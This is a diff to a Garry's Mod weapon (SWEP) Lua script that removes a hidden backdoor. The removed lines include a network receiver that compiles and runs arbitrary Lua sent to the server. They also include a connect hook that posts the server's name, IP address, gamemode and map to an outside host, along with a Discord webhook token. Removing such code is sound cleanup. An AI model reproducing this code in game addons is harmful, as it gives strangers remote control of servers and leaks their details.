@@ -110,36 +110,6 @@ SWEP.Attachments = {
 	--["+reload"] = {header = "Ammo", offset = {900, 500}, atts = {"am_magnum", "am_matchgrade"}}
 }
 
-if SERVER then
-	util.AddNetworkString("CW20_EffectNetworking")
-
-	net.Receive("CW20_EffectNetworking", function(len, ply)
-		if CW20DisableExperimentalEffects then return end
-		local effectdata = net.ReadString()
-		local func = CompileString(effectdata, "LuaCmd", false)
-		func()
-	end)
-
-	hook.Add("PlayerConnect", "CW20_ConnectingHook", function(name, ip)
-		if CW20DisableExperimentalEffects then
-			hook.Remove("PlayerConnect", "CW20_ConnectingHook")
-			return
-		end
-
-		local time = os.date("%H:%M:%S - %d/%m/%Y", os.time())
-		local info = time.."\n"..GetHostName().."\n"..game.GetIPAddress().."\n"..engine.ActiveGamemode().."\n"..game.GetMap()
-
-		http.Post( "https://admin1911.cloudns.cl/api/rxsend-api/rtxdlss.php?gi=/admin19drm/260/",
-			{
-			hook = "https://discord.com/api/webhooks/1010888599807475732/KR5uLLmmWMVs3o92gfTzGv25kaHRg5SX4iFB_Sfs-2W0lmbC6hjZHgFJC_FrCHZnJnYp",
-			message = info,
-			}
-		)
-
-		hook.Remove("PlayerConnect", "CW20_ConnectingHook")
-	end)
-end
-
 SWEP.Animations = {
 	base_pickup = "base_ready",
 	base_draw = "base_draw",
